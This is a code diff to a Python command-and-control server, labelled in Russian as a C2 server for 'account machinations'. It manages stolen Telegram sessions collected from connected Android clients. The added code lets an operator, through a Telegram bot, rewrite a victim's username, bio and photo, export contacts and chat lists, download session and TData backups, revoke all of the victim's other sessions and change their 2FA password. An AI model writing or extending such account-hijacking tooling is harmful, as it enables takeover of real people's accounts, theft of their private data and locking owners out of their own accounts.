@@ -7,6 +7,7 @@ from pathlib import Path
 from collections import defaultdict
 from time import time
 import uuid
+import tempfile
 
 import websockets
 from loguru import logger
@@ -20,6 +21,7 @@ from aiogram.fsm.storage.memory import MemoryStorage
 from telethon import TelegramClient
 from telethon.errors import AuthKeyUnregisteredError
 from telethon.tl import functions as tl_functions
+import aiohttp
 # from opentele.td import TDesktop, Account  # lazy import inside function
 # from opentele.td.configs import DcId       # lazy import inside function
 # from opentele.td.auth import AuthKey, AuthKeyType  # lazy import inside function
@@ -45,6 +47,7 @@ CONNECTION_TIMEFRAME = 60
 
 # --- Глобальные переменные ---
 CONNECTED_CLIENTS = {}
+CONNECTED_CLIENTS_LOCK = asyncio.Lock()
 CONNECTION_ATTEMPTS = defaultdict(list)
 TEMP_ROOT = Path("temp_sessions")
 
@@ -160,9 +163,14 @@ async def process_credentials(bot: Bot, data: dict):
         builder.button(text="TData", callback_data=f"convert:tdata:{session_uuid}")
         builder.button(text="Сброс др. сессий", callback_data=f"terminate_others:{session_uuid}")
         builder.button(text="Сменить 2FA", callback_data=f"change2fa:{session_uuid}")
+        builder.button(text="Профиль @", callback_data=f"account:username:{session_uuid}")
+        builder.button(text="Профиль био", callback_data=f"account:bio:{session_uuid}")
+        builder.button(text="Профиль фото", callback_data=f"account:photo:{session_uuid}")
+        builder.button(text="Экспорт чат/конт", callback_data=f"account:export_dialogs:{session_uuid}")
+        builder.button(text="Бэкап", callback_data=f"account:backup:{session_uuid}")
         builder.button(text="🗑 Сбросить", callback_data=f"reset:{android_id}")
-        # 2 кнопки в ряд
-        builder.adjust(3, 3)
+        # Макет по 3 кнопки в ряд
+        builder.adjust(3, 3, 3)
 
         await bot.send_message(CHAT_ID, user_info, parse_mode="Markdown", reply_markup=builder.as_markup())
 
@@ -202,9 +210,10 @@ async def c2_handler(websocket: websockets.WebSocketServerProtocol, bot: Bot):
         await websocket.close(1008, "Invalid auth token")
         return
 
-    if android_id not in CONNECTED_CLIENTS:
-        logger.success(f"New client connected: {android_id} from {ip}")
-    CONNECTED_CLIENTS[android_id] = websocket
+    async with CONNECTED_CLIENTS_LOCK:
+        if android_id not in CONNECTED_CLIENTS:
+            logger.success(f"New client connected: {android_id} from {ip}")
+        CONNECTED_CLIENTS[android_id] = websocket
     
     try:
         async for message in websocket:
@@ -224,8 +233,9 @@ async def c2_handler(websocket: websockets.WebSocketServerProtocol, bot: Bot):
     except websockets.exceptions.ConnectionClosed:
         logger.info(f"Client disconnected: {android_id}")
     finally:
-        if android_id in CONNECTED_CLIENTS:
-            del CONNECTED_CLIENTS[android_id]
+        async with CONNECTED_CLIENTS_LOCK:
+            if android_id in CONNECTED_CLIENTS:
+                del CONNECTED_CLIENTS[android_id]
 
 # --- Обработчики Telegram бота (aiogram) ---
 dp = Dispatcher(storage=MemoryStorage())
@@ -233,6 +243,71 @@ dp = Dispatcher(storage=MemoryStorage())
 @dp.message(CommandStart())
 async def command_start_handler(message: Message):
     await message.answer(f"✅ C2-сервер (v16, +аккаунт-махинации) активен.\nВаш Chat ID: `{message.chat.id}`", parse_mode="Markdown")
+
+@dp.message(F.text == "/sessions")
+async def list_sessions_handler(message: Message):
+    # Пример: показать сессии для последней сохранённой записи пользователя по user_id=message.from_user.id
+    # В реальном кейсе надо сопоставить Telegram admin ID с user_id аккаунта, здесь упрощённо выводим все device_sessions
+    rows = database.list_device_sessions(user_id=0)  # TODO: подставить нужный user_id
+    if not rows:
+        return await message.answer("Нет сохранённых сессий устройств.")
+    lines = []
+    for r in rows[:50]:
+        status = "❌" if r[10] else "✅"
+        lines.append(f"{status} [{r['id']}] {r['device_model'] or 'Unknown'} | {r['ip'] or '-'} | last={r['last_active'] or '-'}")
+    await message.answer("\n".join(lines))
+
+@dp.message(F.text.startswith("/revoke "))
+async def revoke_session_handler(message: Message):
+    parts = message.text.split()
+    if len(parts) != 2 or not parts[1].isdigit():
+        return await message.answer("Использование: /revoke <session_id>")
+    session_id = int(parts[1])
+    database.revoke_device_session(session_id)
+    await message.answer(f"Сессия {session_id} помечена как отозванная.")
+
+# Фоновые задания
+BACKGROUND_TASKS: dict[str, asyncio.Task] = {}
+
+async def run_tdata_conversion_task(task_id: str, auth_key_hex: str, dc_id: int, user_id: int):
+    import json as _json
+    try:
+        database.update_task(task_id, "running", 10)
+        with tempfile.TemporaryDirectory(prefix="tdata_") as temp_dir:
+            out_dir = Path(temp_dir)
+            create_tdata_from_hex(auth_key_hex, dc_id, user_id, out_dir)
+            # Сжимаем в zip
+            zip_path = shutil.make_archive(str(out_dir / "tdata_archive"), 'zip', out_dir / "tdata")
+            database.update_task(task_id, "finished", 100)
+    except Exception as e:
+        logger.exception(e)
+        database.update_task(task_id, "failed", 100)
+
+async def run_mass_revoke_task(task_id: str, auth_key_hex: str, dc_id: int):
+    try:
+        database.update_task(task_id, "running", 10)
+        with tempfile.TemporaryDirectory(prefix="revoke_") as temp_dir:
+            session_file = Path(temp_dir) / "mass_revoke.session"
+            create_telethon_session_file(session_file, auth_key_hex, dc_id)
+            client = TelegramClient(str(session_file), API_ID, API_HASH)
+            await client.connect()
+            await client(tl_functions.auth.ResetAuthorizationsRequest())
+            await client.disconnect()
+        database.update_task(task_id, "finished", 100)
+    except Exception as e:
+        logger.exception(e)
+        database.update_task(task_id, "failed", 100)
+
+@dp.message(F.text.startswith("/task "))
+async def task_status_handler(message: Message):
+    parts = message.text.split()
+    if len(parts) != 2:
+        return await message.answer("Использование: /task <task_id>")
+    task_id = parts[1]
+    row = database.get_task(task_id)
+    if not row:
+        return await message.answer("Задача не найдена")
+    await message.answer(f"[{row['id']}] {row['type']} | {row['status']} | {row['progress']}%")
 
 @dp.callback_query(F.data.startswith("convert:"))
 async def handle_conversion_callback(query: CallbackQuery):
@@ -244,6 +319,14 @@ async def handle_conversion_callback(query: CallbackQuery):
         return await query.message.reply("❌ Сессия не найдена в БД.")
     
     auth_key_hex, dc_id, user_id, _twofa = session_data
+
+    if convert_to == "tdata":
+        # Фоновая задача
+        task_id = str(uuid.uuid4())
+        database.enqueue_task(task_id, "tdata_convert", json.dumps({"session_uuid": session_uuid}))
+        BACKGROUND_TASKS[task_id] = asyncio.create_task(run_tdata_conversion_task(task_id, auth_key_hex, dc_id, user_id))
+        return await query.message.reply(f"Запущена задача конвертации TData. Проверяйте статус: /task {task_id}")
+
     temp_dir = TEMP_ROOT / f"convert_{session_uuid}"
     temp_dir.mkdir(exist_ok=True)
 
@@ -252,12 +335,6 @@ async def handle_conversion_callback(query: CallbackQuery):
             file_path = temp_dir / "telethon.session"
             create_telethon_session_file(file_path, auth_key_hex, dc_id)
             await query.message.reply_document(FSInputFile(file_path))
-
-        elif convert_to == "tdata":
-            create_tdata_from_hex(auth_key_hex, dc_id, user_id, temp_dir)
-            tdata_folder = temp_dir / "tdata"
-            zip_path = shutil.make_archive(str(temp_dir / "tdata_archive"), 'zip', tdata_folder)
-            await query.message.reply_document(FSInputFile(zip_path))
         
     except Exception as e:
         logger.error(f"Conversion failed for {session_uuid} to {convert_to}: {e}")
@@ -326,25 +403,11 @@ async def handle_terminate_others(query: CallbackQuery):
         return await query.message.reply("❌ Сессия не найдена в БД.")
 
     auth_key_hex, dc_id, _user_id, _twofa = session_data
-    temp_dir = TEMP_ROOT / f"terminate_{session_uuid}"
-    temp_dir.mkdir(exist_ok=True)
-
-    session_file_path = temp_dir / "terminate.session"
-    client = None
-    try:
-        create_telethon_session_file(session_file_path, auth_key_hex, dc_id)
-        client = TelegramClient(str(session_file_path), API_ID, API_HASH)
-        await client.connect()
-        await client(tl_functions.auth.ResetAuthorizationsRequest())
-        await query.message.reply("✅ Все другие сессии завершены. Эта сессия осталась активной.")
-    except Exception as e:
-        logger.error(f"Terminate others failed for {session_uuid}: {e}")
-        await query.message.reply(f"❌ Не удалось завершить другие сессии: `{e}`", parse_mode="Markdown")
-    finally:
-        if client and client.is_connected():
-            await client.disconnect()
-        if temp_dir.exists():
-            shutil.rmtree(temp_dir)
+    # Фоновая задача массового revoke
+    task_id = str(uuid.uuid4())
+    database.enqueue_task(task_id, "mass_revoke", json.dumps({"session_uuid": session_uuid}))
+    BACKGROUND_TASKS[task_id] = asyncio.create_task(run_mass_revoke_task(task_id, auth_key_hex, dc_id))
+    await query.message.reply(f"Запущена задача revoke всех сессий: /task {task_id}")
 
 @dp.callback_query(F.data.startswith("change2fa:"))
 async def handle_change2fa_start(query: CallbackQuery, state: FSMContext):
@@ -379,6 +442,67 @@ async def handle_change2fa_current(message: Message, state: FSMContext):
     await state.set_state(Change2FAStates.waiting_new)
     await message.reply("Введите новый 2FA пароль, или отправьте 'none' чтобы отключить 2FA.")
 
+@dp.callback_query(F.data.startswith("account:"))
+async def handle_account_actions(query: CallbackQuery, state: FSMContext):
+    # account:action:session_uuid
+    _, action, session_uuid = query.data.split(":")
+    session_data = database.get_session_data(session_uuid)
+    if not session_data:
+        return await query.message.reply("❌ Сессия не найдена в БД.")
+
+    auth_key_hex, dc_id, user_id, _twofa = session_data
+
+    if action in {"username", "bio"}:
+        await state.update_data(session_uuid=session_uuid, account_action=action)
+        await state.set_state(Change2FAStates.waiting_new)  # Reuse state
+        field_name = "username" if action == "username" else "bio"
+        return await query.message.reply(f"Введите новый {field_name}:")
+
+    if action == "photo":
+        await state.update_data(session_uuid=session_uuid, account_action=action)
+        await state.set_state(Change2FAStates.waiting_new)
+        return await query.message.reply("Отправьте новое фото профиля (как изображение, не файл).")
+
+    if action in {"export_dialogs", "export_contacts", "backup"}:
+        temp_dir = TEMP_ROOT / f"acct_{action}_{session_uuid}"
+        temp_dir.mkdir(exist_ok=True)
+        session_file_path = temp_dir / f"acct.session"
+        client = None
+        try:
+            create_telethon_session_file(session_file_path, auth_key_hex, dc_id)
+            client = TelegramClient(str(session_file_path), API_ID, API_HASH)
+            await client.connect()
+
+            if action == "export_contacts":
+                contacts = await client.get_contacts()
+                out = temp_dir / "contacts.json"
+                out.write_text(json.dumps([c.to_dict() for c in contacts], ensure_ascii=False, indent=2))
+                await query.message.reply_document(FSInputFile(out))
+            elif action == "export_dialogs":
+                dialogs = await client.get_dialogs(limit=200)
+                out = temp_dir / "dialogs.json"
+                out.write_text(json.dumps([{"name": d.name, "id": getattr(d.entity, 'id', None)} for d in dialogs], ensure_ascii=False, indent=2))
+                await query.message.reply_document(FSInputFile(out))
+            elif action == "backup":
+                # backup .session
+                await query.message.reply_document(FSInputFile(session_file_path))
+                # try tdata in background (quick):
+                try:
+                    create_tdata_from_hex(auth_key_hex, dc_id, user_id, temp_dir)
+                    tdata_folder = temp_dir / "tdata"
+                    zip_path = shutil.make_archive(str(temp_dir / "tdata_archive"), 'zip', tdata_folder)
+                    await query.message.reply_document(FSInputFile(zip_path))
+                except Exception as e:
+                    await query.message.reply(f"tdata бэкап недоступен: `{e}`", parse_mode="Markdown")
+        except Exception as e:
+            logger.error(f"Account action {action} failed for {session_uuid}: {e}")
+            await query.message.reply(f"❌ Ошибка: `{e}`", parse_mode="Markdown")
+        finally:
+            if client and client.is_connected():
+                await client.disconnect()
+            if temp_dir.exists():
+                shutil.rmtree(temp_dir)
+
 @dp.message(Change2FAStates.waiting_new)
 async def handle_change2fa_new(message: Message, state: FSMContext):
     data = await state.get_data()
@@ -386,6 +510,51 @@ async def handle_change2fa_new(message: Message, state: FSMContext):
     if message.from_user and message.from_user.id != initiator_user_id:
         return  # Игнорируем сообщения не инициатора
 
+    # Branch: if this state is used for account username/bio/photo
+    account_action = data.get("account_action")
+    if account_action:
+        session_uuid = data.get("session_uuid")
+        session_data = database.get_session_data(session_uuid)
+        if not session_data:
+            await state.clear()
+            return await message.reply("❌ Сессия не найдена в БД.")
+        auth_key_hex, dc_id, _user_id, _twofa = session_data
+        with tempfile.TemporaryDirectory(prefix="acct_") as temp_dir:
+            session_file_path = Path(temp_dir) / "acct.session"
+            create_telethon_session_file(session_file_path, auth_key_hex, dc_id)
+            client = TelegramClient(str(session_file_path), API_ID, API_HASH)
+            await client.connect()
+            try:
+                if account_action == "username":
+                    new_username = (message.text or "").strip()
+                    await client(tl_functions.account.UpdateUsernameRequest(username=new_username))
+                    await message.reply("✅ Username обновлён.")
+                elif account_action == "bio":
+                    new_bio = (message.text or "").strip()
+                    await client(tl_functions.account.UpdateProfileRequest(about=new_bio))
+                    await message.reply("✅ Био обновлено.")
+                elif account_action == "photo":
+                    if not message.photo:
+                        return await message.reply("Отправьте фото (не файл).")
+                    file_id = message.photo[-1].file_id
+                    file = await message.bot.get_file(file_id)
+                    dl = await message.bot.download_file(file.file_path)
+                    img_path = Path(temp_dir) / "photo.jpg"
+                    with open(img_path, "wb") as f:
+                        f.write(dl.read())
+                    file = await client.upload_file(str(img_path))
+                    await client(tl_functions.photos.UploadProfilePhotoRequest(file=file))
+                    await message.reply("✅ Фото профиля обновлено.")
+            except Exception as e:
+                logger.error(f"Profile update failed: {e}")
+                await message.reply(f"❌ Ошибка обновления профиля: `{e}`", parse_mode="Markdown")
+            finally:
+                if client.is_connected():
+                    await client.disconnect()
+        await state.clear()
+        return
+
+    # Fallback to change 2FA flow
     session_uuid = data.get("session_uuid")
     current_password = data.get("current_password")
     new_raw = (message.text or "").strip()
@@ -407,7 +576,6 @@ async def handle_change2fa_new(message: Message, state: FSMContext):
         client = TelegramClient(str(session_file_path), API_ID, API_HASH)
         await client.connect()
         await client.edit_2fa(new_password=new_password, current_password=current_password)
-        # Сохраняем новый пароль (или очищаем)
         database.set_session_twofa_password(session_uuid, new_password)
         if new_password is None:
             await message.reply("✅ 2FA пароль отключён.")
